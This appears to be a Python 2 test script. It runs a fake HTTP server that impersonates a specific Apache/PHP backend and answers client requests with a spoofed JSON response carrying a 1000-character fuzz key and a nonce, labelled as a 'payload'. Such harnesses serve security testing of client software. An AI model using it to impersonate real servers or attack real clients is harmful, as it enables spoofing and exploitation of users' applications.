import socket
import sys

HOST = "0.0.0.0"
PORT = 80

nonce = sys.argv[1]
fuzz = "A" * 1000

content = "{\"status\":0,\"body\":{\"%s\":\"%s\"}}" % (fuzz, nonce)

#response = "HTTP/1.1 200 OK\r\nDate: Tue, 19 Mar 2013 22:12:25 GMT\r\nServer: Apache\r\nX-Powered-By: PHP/5.3.10-1ubuntu3.2\r\nX-WI-SRV: FR-EQX-WEB-10\r\nAccess-Control-Allow-Origin: *\r\nAccess-Control-Allow-Methods: GET, POST, OPTIONS\r\nAccess-Control-Allow-Credentials: true\r\nAccess-Control-Allow-Headers: Content-Type, *\r\nVary: Accept-Encoding\r\nContent-Length: 48\r\nContent-Type: text/plain\r\n\r\n{\"status\":0,\"body\":{\"once\":\"%s\"}}" % nonce
response = "HTTP/1.1 200 OK\r\nDate: Tue, 19 Mar 2013 22:12:25 GMT\r\nServer: Apache\r\nX-Powered-By: PHP/5.3.10-1ubuntu3.2\r\nX-WI-SRV: FR-EQX-WEB-10\r\nAccess-Control-Allow-Origin: *\r\nAccess-Control-Allow-Methods: GET, POST, OPTIONS\r\nAccess-Control-Allow-Credentials: true\r\nAccess-Control-Allow-Headers: Content-Type, *\r\nVary: Accept-Encoding\r\nContent-Length: %d\r\nContent-Type: text/plain\r\n\r\n%s" % (len(content), content)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))
s.listen(1)
while True:
    conn, addr = s.accept()

    print "Connected by", addr

    while True:
        print "Loop"
        data = conn.recv(1024)
        if not data:
            print "break"
            break
        if "action=get" in data:
            print "Sending payload"
            conn.send(response)
